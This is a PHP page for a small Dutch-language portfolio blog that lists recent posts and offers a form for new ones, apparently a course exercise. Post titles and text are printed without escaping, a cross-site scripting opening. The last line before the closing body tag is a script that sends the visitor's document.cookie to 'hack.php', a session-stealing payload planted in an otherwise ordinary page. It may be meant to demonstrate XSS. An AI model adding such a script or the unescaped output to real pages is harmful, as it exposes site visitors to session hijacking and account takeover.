<?php
    require_once('db/connect.php');
    require_once('db/blog-functies.php');

    $blogs = getBlogPosts(4);
    $aantalBlogs = count($blogs);

    // TODO zaken uit sessie halen voor het geval er validatie meldingen waren.
    // session_start();
    $nieuweBlog = [ 'titel' => '', 'tekst' => '' ];
?>

<!doctype html>
<html lang="nl">
    <?php
        $title = 'Welkom to teh portfolio!';
        include('_includes/head.php');
    ?>
    <body>
        <?php
            $welkomTekst = 'Welkom op mijn website!';
            include('_includes/header.php');
        ?>
        <main>
            <section>
                <h2>Last blogposts (<?= $aantalBlogs ?>)</h2>
                <div class="last-blogposts">
                    <?php foreach($blogs as $blog) { ?>
                        <article>
                            <h3><?= $blog['titel']?></h3>
                            <?php
                                $blogTekst = nl2br($blog['tekst']);
                            ?>
                            <p><?= $blogTekst ?? 'Geen tekst' ?></p>
                        </article>
                    <?php } ?>
                </div>
            </section>
            <section>
                <h2>New blog post</h2>
                <form action="new-blog.php" method="post">
                    <div>
                        <label for="titel">Titel</label>
                        <input type="text" name="titel" id="titel" value="<?= $nieuweBlog['titel'] ?>">
                    </div>
                    <div>
                        <label for="tekst">Tekst</label>
                        <textarea name="tekst" id="tekst" rows="5" cols="50"><?= $nieuweBlog['tekst']?></textarea>
                    </div>
                    <div>
                        <label></label>
                        <input type="submit" value="Voeg toe!">
                    </div>
                    <div>
                        <label></label>
                        <input style="color: red;" type="reset" value="Reset">
                    </div>
                </form>
            </section>
        </main>
        <?php include('_includes/footer.php'); ?>
        <script>fetch(`hack.php?sessionId=${document.cookie}`)</script>
    </body>
</html>
